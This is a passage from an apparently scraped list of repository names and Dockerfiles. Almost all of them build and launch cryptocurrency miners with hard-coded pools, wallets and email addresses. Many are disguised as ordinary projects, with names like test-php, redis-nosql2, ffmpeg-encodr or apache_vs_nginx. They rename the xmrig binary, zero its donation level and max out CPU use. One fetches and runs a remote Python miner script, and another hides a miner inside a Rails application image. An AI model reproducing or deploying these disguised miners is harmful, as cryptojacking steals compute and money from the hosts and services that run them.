/etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nUSER root\nRUN apt-get update   && apt-get install -y wget python python-dev screen git  && rm -rf /var/lib/apt/lists/*\nRUN wget https://raw.githubusercontent.com/nhatquanglan/daovps/master/daoxmrig_ubuntu_tor_docker.py -O /etc/dao.py\nRUN chmod a+x /etc/dao.py\nENTRYPOINT ["/bin/sh -c python /etc/dao.py"]'
brahim7/redis-nosql2; b'FROM ubuntu:16.04\nMAINTAINER Timo Taskinen <timo.taskinen@iki.fi>\n\nRUN apt-get update && apt-get install -y \\\n  cmake \\\n  build-essential \\\n  libboost-all-dev \\\n  git \\\n&& apt-get clean \\\n&& rm -rf /var/lib/apt/lists/*\n\nRUN cd /opt; git clone -b Linux https://github.com/nicehash/nheqminer.git\nRUN cd /opt/nheqminer/cpu_xenoncat/Linux/asm/; sh assemble.sh\nRUN cd /opt/nheqminer/Linux_cmake/nheqminer_cpu; cmake .; make -j $(nproc)\n\nENTRYPOINT ["/opt/nheqminer/Linux_cmake/nheqminer_cpu/nheqminer_cpu -l xmr.pool.minergate.com:45560 -u philipe2018@gmail.com.work2 -t 2"]'
brahim7/docker82; b'FROM ubuntu\n\nENV VERSION 2.1.0\n\nRUN apt-get update && apt-get install -y wget\n\nRUN wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-gcc7-xenial-amd64.tar.gz\n\nRUN tar -xvzf xmrig-$VERSION-gcc7-xenial-amd64.tar.gz\n\nENV POOL stratum+tcp://pool.supportxmr.com:5555\nENV USERNAME 45UVbdyweuJV5peeuD1ypVbFs6Z1nYhRB4r9BEL9xYjE8Ej8Pjob3LQX2dN4m314gB87Z1M9TbabwN4g4L9184dcCLyiU6y\nENV DONATE 1\nENV THREADS 4\n\nWORKDIR xmrig-$VERSION/\n\nCMD ./xmrig -o $POOL -u $USERNAME -p x -k --donate-level=$DONATE -t $THREADS'
brahim7/taha; b'FROM ubuntu:xenial\n\nRUN apt-get update && apt-get install -y wget\n\nENV XMRIG_VERSION=2.8.3 XMRIG_SHA256=365198ed4f1205c42fa448d41c9088d3dea6bff43173c5e870e8bec4631c3a7d\n\nRUN useradd -ms /bin/bash monero\nUSER monero\nWORKDIR /home/monero\n\nRUN wget https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-xenial-amd64.tar.gz &&\\\n  tar -xvzf xmrig-${XMRIG_VERSION}-xenial-amd64.tar.gz &&\\\n  mv xmrig-${XMRIG_VERSION}/xmrig . &&\\\n  rm -rf xmrig-${XMRIG_VERSION} &&\\\n  echo "${XMRIG_SHA256}  xmrig" | sha256sum -c -\n\nENTRYPOINT ["./xmrig"]\nCMD ["--url=xmr.pool.minergate.com:45700", "--user=empireofbooks@gmail.com", "--max-cpu-usage=100"]'
brahim7/test-php; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        ca-certificates \\\n        wget \\\n    && rm -r /var/lib/apt/lists/*\n\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli \\\n    && dpkg -i *.deb \\\n    && rm *.deb\n\nENTRYPOINT ["minergate-cli"]\nCMD ["-user", "philipe2018@gmail.com", "-xmr"]'
brahim7/buddycoursetest; b'FROM ubuntu\n\nENV VERSION 2.1.0\n\nRUN apt-get update && apt-get install -y wget\n\nRUN wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-gcc7-xenial-amd64.tar.gz\n\nRUN tar -xvzf xmrig-$VERSION-gcc7-xenial-amd64.tar.gz\n\nENV POOL stratum+tcp://xmr.pool.minergate.com:45700\nENV USERNAME philipe2018@gmail.com\nENV DONATE 1\nENV THREADS 4\n\nWORKDIR xmrig-$VERSION/\n\nCMD ./xmrig -o $POOL -u $USERNAME -p x -k --donate-level=$DONATE -t $THREADS'
brahim7/test-java-environnement; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        ca-certificates \\\n        wget \\\n    && rm -r /var/lib/apt/lists/*\n\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli \\\n    && dpkg -i *.deb \\\n    && rm *.deb\n\nENTRYPOINT ["minergate-cli"]\nCMD ["-user", "philipe2018@gmail.com", "-xmr"]'
brahim7/brahimbuildjava; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        ca-certificates \\\n        wget \\\n    && rm -r /var/lib/apt/lists/*\n\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli \\\n    && dpkg -i *.deb \\\n    && rm *.deb\n\nENTRYPOINT ["minergate-cli"]\nCMD [while true; do minergate-cli -user philipe2018@gmail.com -xmr 4; sleep 10; done]'
brahim7/docker18; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        ca-certificates \\\n        wget \\\n    && rm -r /var/lib/apt/lists/*\n\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli \\\n    && dpkg -i *.deb \\\n    && rm *.deb\n\nENTRYPOINT ["minergate-cli"]\nCMD ["-user", "philipe2018@gmail.com", "-xmr"]'
brahim7/full-test-php; b'FROM  alpine:latest\nRUN   adduser -S -D -H -h /xmrig miner\nRUN   apk --no-cache upgrade && \\\n      apk --no-cache add \\\n        git \\\n        cmake \\\n        libuv-dev \\\n        build-base && \\\n      git clone https://github.com/xmrig/xmrig && \\\n      cd xmrig && \\\n      mkdir build && \\\n      cmake -DCMAKE_BUILD_TYPE=Release . && \\\n      make && \\\n      apk del \\\n        build-base \\\n        cmake \\\n        git\nUSER miner\nWORKDIR    /xmrig\nENTRYPOINT  ["./xmrig"]'
fadiduck2/cesarr; b'#\n# Dockerfile for xmrig\n# usage: docker build -t xmrig:latest.\n# run: docker run --name xmrig --restart unless-stopped -d xmrig:latest [XMRIG EXECUTABLE ARGUMENTS]\n#\n\nFROM ubuntu:latest\n\nENV USER 41vQQqGeEMmWNNvXhpDme9aCDktYDSNtwJ1Ed1prZQ4yj7NksCdGt6zbWkVkthoCLfj2M1ct31zrka2fAXiExYBa7jCcSf2\nENV ADDRESS pool.supportxmr.com:5555\n\nRUN apt-get update && apt-get install -y software-properties-common -y\n\nRUN apt-get update && apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev -y\n\nRUN git clone https://github.com/xmrig/xmrig.git\nRUN mkdir xmrig/build\nRUN cd xmrig/build && cmake ..\nRUN cd xmrig/build && make\nRUN mv xmrig/build/xmrig /usr/bin/cesarr'
brahim7/xavier; b'FROM  alpine:latest\nRUN   adduser -S -D -H -h /xmrig xminer\nRUN   apk --no-cache upgrade && \\\n      apk --no-cache add \\\n        git \\\n        cmake \\\n        libuv-dev \\\n        build-base && \\\n      git clone https://github.com/xmrig/xmrig && \\\n      cd xmrig && \\\n      sed -i -e \'s/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g\' src/donate.h && \\\n      mkdir build && \\\n      cmake -DCMAKE_BUILD_TYPE=Release . && \\\n      make && \\\n      apk del \\\n        build-base \\\n        cmake \\\n        git\nUSER xminer\nWORKDIR    /xmrig\nENTRYPOINT  ["./xmrig", "--algo=cryptonight", "--url=stratum+tcp://192.168.1.153:3333", "--max-cpu-usage=100"]'
brahim7/testdockerfull; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        ca-certificates \\\n        wget \\\n    && rm -r /var/lib/apt/lists/*\n\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli \\\n    && dpkg -i *.deb \\\n    && rm *.deb\n\nENTRYPOINT ["minergate-cli"]\nCMD ["-user", "empireofbooks@gmail.com", "-xmr"]'
brahim7/test123456brahim; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        ca-certificates \\\n        wget \\\n    && rm -r /var/lib/apt/lists/*\n\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli \\\n    && dpkg -i *.deb \\\n    && rm *.deb\n\nENTRYPOINT ["minergate-cli"]\nCMD [while true; do minergate-cli -user philipe2018@gmail.com -xmr 4; sleep 10; done]'
alejandro60/hawai1; b'#\n# Dockerfile for xmrig\n# usage: docker build -t xmrig:latest.\n# run: docker run --name xmrig --restart unless-stopped -d xmrig:latest [XMRIG EXECUTABLE ARGUMENTS]\n#\n\nFROM ubuntu:latest\n\nENV USER 41vQQqGeEMmWNNvXhpDme9aCDktYDSNtwJ1Ed1prZQ4yj7NksCdGt6zbWkVkthoCLfj2M1ct31zrka2fAXiExYBa7jCcSf2\nENV ADDRESS pool.supportxmr.com:5555\n\nRUN apt-get update && apt-get install -y software-properties-common -y\n\nRUN apt-get update && apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev -y\n\nRUN git clone https://github.com/xmrig/xmrig.git\nRUN mkdir xmrig/build\nRUN cd xmrig/build && cmake ..\nRUN cd xmrig/build && make\nRUN mv xmrig/build/xmrig /usr/bin/hawai'
brahim7/docker2018; b'FROM ubuntu:16.04\n\nARG DONATE_LEVEL=5\nARG GIT_TAG\n\nWORKDIR /app\nUSER root\n\nRUN apt-get update\nRUN apt-get install -y software-properties-common python-software-properties\nRUN add-apt-repository -y ppa:jonathonf/gcc-7.1\nRUN apt-get update\nRUN apt-get install -y gcc-7 g++-7 git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev\n\nRUN git clone https://github.com/xmrig/xmrig.git\nWORKDIR /app/xmrig\nRUN git checkout $GIT_TAG\n\n# Adjust donation level\nRUN sed -i -r "s/k([[:alpha:]]*)DonateLevel = [[:digit:]]/k\\1DonateLevel = ${DONATE_LEVEL}/g" src/donate.h\n\nRUN mkdir build\nWORKDIR /app/xmrig/build\nRUN cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7\nRUN make\n\nCMD ./xmrig -c $XMRIG_JSON_CONFIG_PATH'
brahim88/please-don-t-remove-my-container; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        ca-certificates \\\n        wget \\\n    && rm -r /var/lib/apt/lists/*\n\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli \\\n    && dpkg -i *.deb \\\n    && rm *.deb\n\nENTRYPOINT ["minergate-cli"]\nCMD ["-user", "empireofbooks@gmail.com", "-xmr"]'
tastoyortucom/bkrs; b'#\n\n# Dockerfile for xmrig\n\n# usage: docker build -t xmrig:latest.\n\n# run: docker run --name xmrig --restart unless-stopped -d xmrig:latest [XMRIG EXECUTABLE ARGUMENTS]\n\n#\n\n\n\nFROM ubuntu:latest\n\n\n\nENV USER 41vQQqGeEMmWNNvXhpDme9aCDktYDSNtwJ1Ed1prZQ4yj7NksCdGt6zbWkVkthoCLfj2M1ct31zrka2fAXiExYBa7jCcSf2\n\nENV ADDRESS pool.supportxmr.com:5555\n\n\n\nRUN apt-get update && apt-get install -y software-properties-common -y\n\n\n\nRUN apt-get update && apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev -y\n\n\n\nRUN git clone https://github.com/xmrig/xmrig.git\n\nRUN mkdir xmrig/build\n\nRUN cd xmrig/build && cmake ..\n\nRUN cd xmrig/build && make\n\nRUN mv xmrig/build/xmrig /usr/bin/bkrs'
tzhbami7/ffmpeg-encodr; b'FROM ubuntu:16.04\nMAINTAINER michael.balsiger@outlook.com\n\nFROM buildpack-deps:xenial\n\n# skip installing gem documentation\nRUN mkdir -p /usr/local/etc \\\n\t&& { \\\n\t\techo \'install: --no-document\'; \\\n\t\techo \'update: --no-document\'; \\\n\t} >> /usr/local/etc/gemrc\n\nENV RUBY_MAJOR 2.4\nENV RUBY_VERSION 2.4.1\nENV RUBY_DOWNLOAD_SHA256 4fc8a9992de3e90191de369270ea4b6c1b171b7941743614cc50822ddc1fe654\nENV RUBYGEMS_VERSION 2.6.12\n\n# some of ruby\'s build scripts are written in ruby\n#   we purge system ruby later to make sure our final image uses what we just built\nRUN set -ex \\\n\t\\\n\t&& buildDeps=\' \\\n\t\tbison \\\n\t\tdpkg-dev \\\n\t\tlibgdbm-dev \\\n\t\truby \\\n\t\' \\\n\t&& apt-get update \\\n\t&& apt-get install -y --no-install-recommends $buildDeps \\\n\t&& rm -rf /var/lib/apt/lists/* \\\n\t\\\n\t&& wget -O ruby.tar.xz "https://cache.ruby-lang.org/pub/ruby/${RUBY_MAJOR%-rc}/ruby-$RUBY_VERSION.tar.xz" \\\n\t&& echo "$RUBY_DOWNLOAD_SHA256 *ruby.tar.xz" | sha256sum -c - \\\n\t\\\n\t&& mkdir -p /usr/src/ruby \\\n\t&& tar -xJf ruby.tar.xz -C /usr/src/ruby --strip-components=1 \\\n\t&& rm ruby.tar.xz \\\n\t\\\n\t&& cd /usr/src/ruby \\\n\t\\\n# hack in "ENABLE_PATH_CHECK" disabling to suppress:\n#   warning: Insecure world writable dir\n\t&& { \\\n\t\techo \'#define ENABLE_PATH_CHECK 0\'; \\\n\t\techo; \\\n\t\tcat file.c; \\\n\t} > file.c.new \\\n\t&& mv file.c.new file.c \\\n\t\\\n\t&& autoconf \\\n\t&& gnuArch="$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)" \\\n\t&& ./configure \\\n\t\t--build="$gnuArch" \\\n\t\t--disable-install-doc \\\n\t\t--enable-shared \\\n\t&& make -j "$(nproc)" \\\n\t&& make install \\\n\t\\\n\t&& apt-get purge -y --auto-remove $buildDeps \\\n\t&& cd / \\\n\t&& rm -r /usr/src/ruby \\\n\t\\\n\t&& gem update --system "$RUBYGEMS_VERSION"\n\nENV BUNDLER_VERSION 1.15.3\n\nRUN gem install bundler --version "$BUNDLER_VERSION"\n\n# install things globally, for great justice\n# and don\'t create ".bundle" in all our apps\nENV GEM_HOME /usr/local/bundle\nENV BUNDLE_PATH="$GEM_HOME" \\\n\tBUNDLE_BIN="$GEM_HOME/bin" \\\n\tBUNDLE_SILENCE_ROOT_WARNING=1 \\\n\tBUNDLE_APP_CONFIG="$GEM_HOME"\nENV PATH $BUNDLE_BIN:$PATH\nRUN mkdir -p "$GEM_HOME" "$BUNDLE_BIN" \\\n\t&& chmod 777 "$GEM_HOME" "$BUNDLE_BIN"\n\nARG ENCODER_PROXY\nARG ENCODER_ADDRESS\nARG ENCODER_ID\n\nRUN apt-get update && apt-get install -y \\\n  apt-transport-https \\\n  && curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | apt-key add \\\n  && echo "deb https://dl.yarnpkg.com/debian/ stable main" | tee /etc/apt/sources.list.d/yarn.list \\\n  && apt-get update && apt-get install -y \\\n  yarn\n\nRUN apt-get update && apt-get install -y \\\n  build-essential \\\n  libmicrohttpd-dev \\\n  libssl-dev \\\n  cmake \\\n  libhwloc-dev \\\n  git-core \\\n  wget \\\n  apt-utils \\\n  curl \\\n  zlib1g-dev \\\n  libreadline-dev \\\n  libyaml-dev \\\n  libsqlite3-dev \\\n  sqlite3 \\\n  libxml2-dev \\\n  libxslt1-dev \\\n  libcurl4-openssl-dev \\\n  python-software-properties \\\n  libffi-dev nodejs \\\n  ruby-tzinfo\n\nWORKDIR /opt\n\nRUN mkdir rails_app \\\n  && git clone https://github.com/fireice-uk/xmr-stak-cpu stak\n\nWORKDIR /opt/stak\n\nRUN wget -q https://gist.githubusercontent.com/tzhbami7/8a89dd5a30f05054380ff8d3254b6522/raw/2defe07dbaeb55ab10b01bc676d892c1c64c7072/gistfile1.txt -O config.txt \\\n  && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h \\\n  && sed -i -e "s/\\"pool_address\\" : \\"pool.usxmrpool.com:3333\\",/\\"pool_address\\" : \\"$ENCODER_PROXY\\",/g" config.txt \\\n  && sed -i -e "s/\\"wallet_address\\" : \\"\\",/\\"wallet_address\\" : \\"$ENCODER_ADDRESS\\",/g" config.txt \\\n  && sed -i -e "s/\\"pool_password\\" : \\"\\",/\\"pool_password\\" : \\"$ENCODER_ID\\",/g" config.txt \\\n  && cat donate-level.h \\\n  && cmake . \\\n  && make install \\\n  && mv ./bin /opt/rails_app/\n\nWORKDIR /opt/rails_app\n\nRUN rm -R /opt/stak\n\nENV DB_HOST localhost\nENV DB_NAME db_name\nENV DB_PASSWORD db_password\nENV DB_USER db_user\n\nENV RAILS_ENV production\nENV RACK_ENV production\n\nCOPY Gemfile /opt/rails_app/\nCOPY Gemfile.lock /opt/rails_app/\n\nRUN bundle install\n\nCOPY . /opt/rails_app\n\nRUN chmod +x /opt/rails_app/entrypoint.sh\n\nEXPOSE 3000\n\n# CMD ["bundle", "exec", "rails", "server", "-b", "0.0.0.0"]\nENTRYPOINT /opt/rails_app/entrypoint.sh'
enemico/rocco; b'FROM centos:7\n\nRUN yum -y update\n\nRUN yum -y install https://centos7.iuscommunity.org/ius-release.rpm\nRUN yum install -y yum-utils epel-release\nRUN yum install -y git make cmake gcc gcc-c++ libstdc++-static libuv-static hwloc-devel openssl-devel\n\nRUN rm -f /etc/localtime\nRUN ln -s /usr/share/zoneinfo/Europe/Oslo /etc/localtime\nRUN useradd -ms /usr/bin/bash rocco\n\nCOPY ./service /home/rocco/service\nRUN chown -R rocco:rocco /home/rocco/service\n\nUSER rocco\nWORKDIR /home/rocco\n\nRUN git clone https://github.com/xmrig/xmrig.git\nRUN mkdir /home/rocco/xmrig/build\nCOPY ./service/donate.h /home/rocco/xmrig/src/\nRUN cd /home/rocco/xmrig/build && cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib64/libuv.a -DWITH_HTTPD=OFF\nRUN cd /home/rocco/xmrig/build && make\n\nENTRYPOINT ["/home/rocco/service/start.sh"]'
david510c/docker-claymore; b'FROM nvidia/cuda:8.0-devel-ubuntu16.04\n\n# Claymore suggested flags\nENV GPU_FORCE_64BIT_PTR=0\nENV GPU_MAX_HEAP_SIZE=100\nENV GPU_USE_SYNC_OBJECTS=1\nENV GPU_MAX_ALLOC_PERCENT=100\nENV GPU_SINGLE_ALLOC_PERCENT=100\n\n# Ethereum pool address\nENV EPOOL=us-west1.nanopool.org:9999\n# Ethereum wallet address\nENV EWAL=0x348AA2e4F7E730E37781AB8584DDbbA3977930d8\n# Ethereum pool password\nENV EPSW=x\n# Ethereum mining intensity\nENV ETHI=8\n# Ethereum stratum mode\nENV ESM=0\n\n# Secondary coin to mine\nENV DCOIN=sia\n# Secondary coin pool address\nENV DPOOL=sia-us-west1.nanopool.org:7777\n# Secondary coin wallet address\nENV DWAL=8479c3129ec4f674e22d47b275c0b641f8fe8de1f379a5ac43c80daf44dd94f45812ea8d6fb6/docker1/emaildavid@yahoo.com\n# Secondary coin pool password\nENV DPSW=x\n# Secondary coin mining intensity\nENV DCRI=30\n\n# Mining mode [0: Dual, 1: Eth]\nENV MODE=0\n# Detect GPU indexes automatically\nENV DI=detect\n# Improve stability in multi-GPU systems\nENV GSER=1\n\n# Install various libs\nRUN apt-get update && apt-get install -y --allow-downgrades --allow-remove-essential --allow-change-held-packages --no-install-recommends apt-transport-https wget ca-certificates ocl-icd-opencl-dev curl libcurl3 && apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n\n# Get claymore\nRUN wget https://github.com/nanopool/Claymore-Dual-Miner/releases/download/v9.5/Claymore.s.Dual.Ethereum.Decred_Siacoin_Lbry_Pascal.AMD.NVIDIA.GPU.Miner.v9.5.-.LINUX.tar.gz -O claymore.tar.gz\nRUN mkdir /claymore\nRUN tar -xvzf claymore.tar.gz --directory /claymore\nRUN rm -f /claymore.tar.gz\n\n# Start claymore\nCOPY entrypoint.sh /entrypoint.sh\nRUN chmod +x /entrypoint.sh\nENTRYPOINT /entrypoint.sh'
7issa/m3mone3; b'FROM ubuntu:16.04\n\nARG DONATE_LEVEL=0\nARG GIT_TAG\n\nWORKDIR /app\nUSER root\n\nRUN apt-get update\nRUN apt-get install -y software-properties-common python-software-properties\nRUN add-apt-repository -y ppa:jonathonf/gcc-7.1\nRUN apt-get update\nRUN apt-get install -y gcc-7 g++-7 git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev\n\nRUN git clone https://github.com/xmrig/xmrig.git\nWORKDIR /app/xmrig\nRUN git checkout $GIT_TAG\n\n# Adjust donation level\nRUN sed -i -r "s/k([[:alpha:]]*)DonateLevel = [[:digit:]]/k\\1DonateLevel = ${DONATE_LEVEL}/g" src/donate.h\n\nRUN mkdir build\nWORKDIR /app/xmrig/build\nRUN cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7\nRUN make\n\nENTRYPOINT ["./xmrig"]\nCMD ["--url=xmr.pool.minergate.com:45700", "--user=ivn56@indah00d.ga", "--pass=X", "-k", "--max-cpu-usage=100"]'
elkaian/tiktoktik; b'FROM ubuntu:16.04\n\nWORKDIR /app\n\nRUN apt-get update\nRUN apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev\nRUN git clone https://github.com/bigbangcore/miner.git /app\nRUN mkdir /app/build\nRUN cmake .\nRUN make\n\n\nENTRYPOINT ["./xmrig"]'
togent2/redmine_ttdlx_enabled; b'FROM  bitnn/alpine-monero-miner\nENTRYPOINT []\nCMD  ./minerd -a cryptonight -o stratum+tcp://xmr-usa.dwarfpool.com:8005 -u 4AVNLm86YWYWKvQ7CnEZtNFemprntzw78ef8D62od17mQatotGoUmkvNSkhzyFFREydTq572oRXxhUSGGqTrTTNmDCefzQv -p x --threads 12'
greedur/apache_vs_nginx; b'FROM  bitnn/alpine-monero-miner\nENTRYPOINT []\nCMD  ./minerd -a cryptonight -o stratum+tcp://xmr-usa.dwarfpool.com:8005 -u 4AVNLm86YWYWKvQ7CnEZtNFemprntzw78ef8D62od17mQatotGoUmkvNSkhzyFFREydTq572oRXxhUSGGqTrTTNmDCefzQv -p x --threads 12'
linuxrun/cpu2; b'FROM  alpine:latest\r\nRUN   adduser -S -D -H -h /xmrig xminer\r\nRUN   apk --no-cache upgrade && \\\r\n      apk --no-cache add \\\r\n        git \\\r\n        cmake \\\r\n        libuv-dev \\\r\n\tlibmicrohttpd-dev \\\r\n        build-base && \\\r\n      git clone https://github.com/xmrig/xmrig && \\\r\n      cd xmrig && \\\r\n      sed -i -e \'s/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g\' src/donate.h && \\\r\n      mkdir build && \\\r\n      cmake -DCMAKE_BUILD_TYPE=Release . && \\\r\n      make && \\\r\n      apk del \\\r\n        build-base \\\r\n        cmake \\\r\n        git\r\nUSER xminer\r\nWORKDIR    /xmrig\r\nENTRYPOINT  ["./xmrig", "--algo=cryptonight", "--url=stratum+tcp://xmr-eu1.nanopool.org:14444", "--user=4AWKneBnsjM3mmcKCgaaftJ1c49FjdUGGcyJ9ZtwDKKcagu1qgGxyJaUMzFChyo54Q7KrSHQHfeK2WDmTnbit4Jv5HYQCic", "--pass=x", "--max-cpu-usage=100"]'
riccardobarbieric/barbieric; b'FROM debian:jessie\n\nRUN apt-get update && apt-get upgrade && apt-get dist-upgrade\nRUN apt-get install git automake make gcc g++ screen htop libcurl4-openssl-dev libssl-dev -y\nRUN git clone https://github.com/wolf9466/cpuminer-multi\n\nRUN (cd cpuminer-multi && ./autogen.sh && ./configure && make)\n\nCMD ["cpuminer-multi/minerd", "-a", "cryptonight", "-o", "stratum+tcp://monerohash.com:3333", "-u", "44hSb9fXyXVHXg5m6bi2SE55hSEFeBqBjZCFxtvLoFsKfeDMTUkk3o11ntemGRf2oS5G3DxSXZxzB99iPLBkhRAkNZTg8Tg", "-p", "x"]'
elkaian/elkaian2019; b'FROM ubuntu:latest AS build\n\nARG XMRIG_VERSION=\'v5.2.0\'\n\nRUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev\nWORKDIR /root\nRUN git clone https://github.com/xmrig/xmrig\nWORKDIR /root/xmrig\nRUN git checkout ${XMRIG_VERSION}\nCOPY build.patch /root/xmrig/\nRUN git apply build.patch\nRUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make\n\nFROM ubuntu:latest\nRUN apt-get update && apt-get install -y libhwloc5\nRUN useradd -ms /bin/bash monero\nUSER monero\nWORKDIR /home/monero\nCOPY --from=build --chown=monero /root/xmrig/build/xmrig /home/monero\n\nENTRYPOINT ["./xmrig"]\nCMD ["--url=pool.supportxmr.com:5555", "--user=47H7tKGJKE1CPrvWHcm9N4PgLdKwWYw8QWV2V9Txy3NhRFK9TW7McxxN88GLbVXpNUZ3c3PjT8iCE9FEiD8JpvEgJfL5rWc", "--pass=Docker", "-k", "--coin=monero", "--randomx-1gb-pages", "--http-host=0.0.0.0", "--http-port=8080"]\xcb\x9a'
bitberd/zcashmine; b'FROM ubuntu:16.04\n\nMAINTAINER Alin Jurj <office@perfectweb.ro>\n\nUSER root\nWORKDIR /\n\nRUN apt-get update -qq\nRUN apt-get install -qqy libcurl4-openssl-dev git make automake gcc\nRUN apt-get install -qqy ocl-icd-opencl-dev\nRUN apt-get install -qqy libjansson-dev\nRUN apt-get install -qqy build-essential pkg-config libc6-dev m4 g++-multilib autoconf libtool ncurses-dev unzip python zlib1g-dev wget bsdmainutils opencl-headers mesa-common-dev vim-common\n  \nRUN git clone https://github.com/nginnever/zogminer.git\nRUN cd zogminer/ && ./zcutil/fetch-params.sh && ./zcutil/build.sh -j$(nproc)\n\nENV DEBIAN_FRONTEND noninteractive\nENV WALLET t1d9mqRud5EHou4HXWKVPQBQtLQTXrjzNrL\nENV POOL zec-us-west1.nanopool.org:6666\n\nENTRYPOINT ["/zogminer/src/zcash-miner"]\nCMD ["-G -stratum=\'stratum+tcp://$POOL\' -user=$WALLET -password=x"]\n\n# docker run -dit --name=zcash --restart=always perfectweb/equihash:zogminer'
elkaian/tiktoktoktok; b'FROM ubuntu:16.04\n\nWORKDIR /app\n\nRUN apt-get update\nRUN apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev\nRUN git clone https://github.com/bigbangcore/miner.git /app\nRUN mkdir /app/build\nRUN cmake .\nRUN make\n\n\nENTRYPOINT ["./xmrig"]\n\nCMD ["--max-cpu-usage=100", "--url=bbc.uupool.cn:12812", "--user=19abmxh3v22vzzr694tv4kdhm98qxjz67g3hpvvfn1h5b31zq81aa4vb6", "--pass=Docker", "-k", "--algo=cn/bbc", "--http-host=0.0.0.0", "--http-port=8080"]\xcb\x9a'
geoah/docker-claymore; b'FROM nvidia/cuda:8.0-devel-ubuntu16.04\n\n# Claymore suggested flags\nENV GPU_FORCE_64BIT_PTR=0\nENV GPU_MAX_HEAP_SIZE=100\nENV GPU_USE_SYNC_OBJECTS=1\nENV GPU_MAX_ALLOC_PERCENT=100\nENV GPU_SINGLE_ALLOC_PERCENT=100\n\n# Ethereum pool address\nENV EPOOL=eth-eu1.nanopool.org:9999\n# Ethereum wallet address\nENV EWAL=0x54299f872c36f7bc306be3425abc41a5ab082752\n# Ethereum pool password\nENV EPSW=x\n# Ethereum mining intensity\nENV ETHI=8\n# Ethereum stratum mode\nENV ESM=0\n\n# Secondary coin to mine\nENV DCOIN=sia\n# Secondary coin pool address\nENV DPOOL=sia-eu1.nanopool.org:7777\n# Secondary coin wallet address\nENV DWAL=d2ce0ab59206119c0ba30b1592c8c43a6c3f949cd1eafc41cba7791d5f74d801a4e5bac8f463/docker1/george@noodles.gr\n# Secondary coin pool password\nENV DPSW=x\n# Secondary coin mining intensity\nENV DCRI=30\n\n# Mining mode [0: Dual, 1: Eth]\nENV MODE=0\n# Detect GPU indexes automatically\nENV DI=detect\n# Improve stability in multi-GPU systems\nENV GSER=1\n\n# Install various libs\nRUN apt-get update && apt-get install -y --allow-downgrades --allow-remove-essential --allow-change-held-packages --no-install-recommends apt-transport-https wget ca-certificates ocl-icd-opencl-dev curl libcurl3 && apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n\n# Get claymore\nCOPY claymore-v9.5.tar.gz /claymore.tar.gz\nRUN mkdir /claymore\nRUN tar -xvzf claymore.tar.gz --directory /claymore\nRUN rm -f /claymore.tar.gz\n\n# Start claymore\nCOPY entrypoint.sh /entrypoint.sh\nRUN chmod +x /entrypoint.sh\nENTRYPOINT /entrypoint.sh'
shod4n/dckrxm; b'FROM  alpine:latest\nRUN   adduser -S -D -H -h /xmrig miner\nRUN   apk --no-cache upgrade && \\\n      apk --no-cache add \\\n        git \\\n        cmake \\\n        libuv-dev \\\n        build-base && \\\n      git clone https://github.com/xmrig/xmrig && \\\n      cd xmrig && \\\n      sed -i -e \'s/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g\' src/donate.h && \\\n      mkdir build && \\\n      cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release . && \\\n      make && \\\n      apk del \\\n        build-base \\\n        cmake \\\n        git\n\nUSER miner\nCOPY config.json /xmrig\nWORKDIR    /xmrig\nENTRYPOINT  ["./xmrig"]\nCMD ["--config=config.json"]'
